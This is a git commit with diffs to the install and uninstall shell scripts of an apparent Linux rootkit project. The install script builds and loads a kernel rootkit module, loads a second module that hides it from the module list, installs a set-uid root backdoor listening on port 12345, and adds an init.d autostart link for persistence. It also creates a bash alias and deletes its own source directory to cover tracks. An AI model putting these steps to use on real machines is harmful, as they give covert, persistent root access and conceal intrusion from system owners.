5f1a65f4f93eb18c08880f07fa2adc166597aaef
chaiyulong <cyl_sccd@163.com>
2014-05-26 09:09:54 +0800

    add /bin to store the tar files

--- src/v2-1/my_rootkit.sh
+++ src/v2-1/my_rootkit.sh
@@ -1,25 +1,39 @@
 #!/bin/bash
 # ./my_rootkit.sh
 
-#CUR_DIR=$(shell pwd)
-#make
+# get the current directory of the shell script
+CUR_DIR=$(pwd)
+
+# create module files .ko
 make
+# create the binary execute file named backdoor
 gcc backdoor.c -o backdoor
 
+# copy the files to the root directory
 cp my_rootkit.ko remove_module.ko backdoor /
+# change the backdoor to set-uid programme, it can promote the priviledge to root
 chmod u+s /backdoor
 
+# copy the auto-start shell script to /etc/init.d/
 chmod 755 my_rootkit_init.sh
 cp my_rootkit_init.sh /etc/init.d/
 
+# create one symbol link of auto-start shell script
 ln -s /etc/init.d/my_rootkit_init.sh /etc/rc2.d/S75my_rootkit
-ln -s /bin/sh /bin/my_rootkit_sh
+# create one symbol link of /bin/bash
+ln -s /bin/bash /bin/my_rootkit_sh
 
+# load rootkit module file
 insmod /my_rootkit.ko
+# load remove module file which remove rootkit module info from module list
 insmod /remove_module.ko
+# unload remove module file
 rmmod /remove_module
 
+# start backdoor which port is 12345
 /backdoor 12345
-#rm -r -f CUR_DIR
+
+# remove the source files
+rm -r -f ${CUR_DIR}
 
 
--- src/v2-1/my_rootkit_uninstall.sh
+++ src/v2-1/my_rootkit_uninstall.sh
@@ -1,12 +1,16 @@
 #!/bin/bash
-# 
+# ./my_rootkit_uninstall.sh 
 
-#rmmod -f my_rootkit
-#backdoor_pid=$(shell ps -ef | grep backdoor | grep -v grep | cut -c 9-15)
-#echo backdoor_pid
+# kill the process of backdoor
+#backdoor_pid=$(ps -ef | grep backdoor | grep -v grep | cut -c 9-15)
+#echo ${backdoor_pid}
 pkill -9 backdoor
 
+# delete the modules and execute file of backdoor
 rm -f /my_rootkit.ko /remove_module.ko /backdoor
+# delete the sysmbol link of /bin/bash
 rm -f /bin/my_rootkit_sh
+# delete the auto-start shell script
 rm -f /etc/init.d/my_rootkit_init.sh
+# delete the link of auto-start shell script
 rm -f /etc/rc2.d/S75my_rootkit
